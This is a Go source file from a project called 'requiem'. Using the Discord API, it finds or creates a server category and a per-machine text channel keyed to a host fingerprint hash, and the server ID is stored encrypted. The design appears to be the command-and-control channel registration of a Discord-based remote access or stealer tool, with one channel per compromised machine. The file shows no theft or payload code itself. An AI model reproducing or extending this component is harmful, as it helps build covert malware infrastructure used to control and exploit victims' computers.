package discord

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	_DEFAULT_CATEGORY_NAME string = "string2"
	_DEFAULT_CHANNEL_NAME  string = "nofina9"
)

func FindOrCreateFallbackCategory(ses *discordgo.Session) (string, error) {
	channels, err := ses.GuildChannels(store.DecryptedServerID)
	if err != nil {
		return "", err
	}

	for _, channel := range channels {
		if channel.Type != discordgo.ChannelTypeGuildCategory {
			continue
		}

		if strings.ToLower(channel.Name) != _DEFAULT_CATEGORY_NAME {
			continue
		}

		return channel.ID, nil
	}

	channel, err := ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
		Name: _DEFAULT_CATEGORY_NAME,
		Type: discordgo.ChannelTypeGuildCategory,
	})

	if err != nil {
		return "", err
	}

	return channel.ID, nil
}

// the 2nd return is if the channel was newly created
func FindOrCreateChannel(ses *discordgo.Session, categoryID string) (string, bool, error) {
	channels, err := ses.GuildChannels(store.DecryptedServerID)
	if err != nil {
		return "", false, err
	}

	hash, hmac := funcs.GenFingerprint()
	if hash == "" || hmac == "" || store.DEBUG_MODE_USE_DEFAULT_CHANNEL_NAME {
		utils.DebugLog(fmt.Sprintf("failed to generate fingerprint, using default channel name"))

		hash = _DEFAULT_CHANNEL_NAME
		hmac = _DEFAULT_CHANNEL_NAME
	}

	for _, channel := range channels {
		if channel.Topic != hash {
			continue
		}

		if channel.Type != discordgo.ChannelTypeGuildText {
			continue
		}

		if channel.ParentID != categoryID {
			continue
		}

		return channel.ID, false, nil
	}

	channel, err := ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
		Name:     hmac, // dont wanna shove the whole hash in the name, also, it checks only the topic
		Topic:    hash,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})

	if err == nil {
		return channel.ID, true, nil
	}

	utils.DebugLog(fmt.Sprint("failed to create channel, retrying with default category..."))

	categoryID, err = FindOrCreateFallbackCategory(ses)
	if err != nil {
		return "", false, err
	}

	channel, err = ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
		Name:     hmac, // dont wanna shove the whole hash in the name, also, it checks only the topic
		Topic:    hash,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})

	if err != nil {
		return "", false, err
	}

	return channel.ID, true, nil
}
